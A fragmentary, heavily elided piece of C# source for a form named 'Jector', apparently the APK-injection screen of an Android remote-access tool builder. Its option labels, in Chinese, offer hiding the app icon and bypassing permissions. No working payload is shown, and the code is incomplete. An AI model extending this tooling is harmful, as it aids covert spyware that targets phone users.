...
public partial class Jector : Form
{
    ...
    public Exception VB_0024Local_ex { get; private set; }
	...
	public void Translateme()
	{
		...
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			...
			else
			{
				...
				this.checkautoclick.Text = "卸载后隐藏图标";
				this.checkDraw.Text = "授予在应用程序上绘制";
				this.checkkeepscreen.Text = "隐藏绕过权限";
	...
	private void addactiv_click(object sender, EventArgs e)
	{
		...
		{
			CraxsAlert.ShowWarning("Select Apk Folder First");
		}
	}
	...
	public void Startwork()
	{
		...
		checked
		{
			...
			if (!this.CheckAutomatic.Checked)
			{
                ...
                //using (var enumerator2 = this.Activlist.Items.GetEnumerator())
                {
	...
	private void Removeactiv_Click(object sender, EventArgs e)
	{
		if (this.Activlist.Items.Count > 0)
		{
			...
			{
				CraxsAlert.Showinformation("Select Activity First");
			}
		}
		else
		{
			CraxsAlert.Showinformation("Activity List: 0");
		}
	}
    ...
    private void checkautoclick_CheckedChanged(object sender, EventArgs e)
    {
